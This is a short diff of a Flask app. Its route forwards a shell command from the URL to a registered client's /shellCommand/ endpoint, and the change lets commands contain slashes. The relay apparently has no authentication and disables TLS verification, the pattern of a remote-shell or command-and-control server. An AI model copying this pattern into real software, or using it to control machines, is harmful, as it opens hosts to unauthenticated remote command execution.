@@ -23,7 +23,7 @@ def registerClient():
 def getClients():
     return dumps(clients)
 
-@app.route('/shell/<client_id>/<command>', methods=('GET', ))
+@app.route('/shell/<client_id>/<path:command>', methods=('GET', ))
 def sendShellCommand(client_id: int, command: str):
     return get(clients[int(client_id)]['addr'] + '/shellCommand/' + command, verify=False).text
 
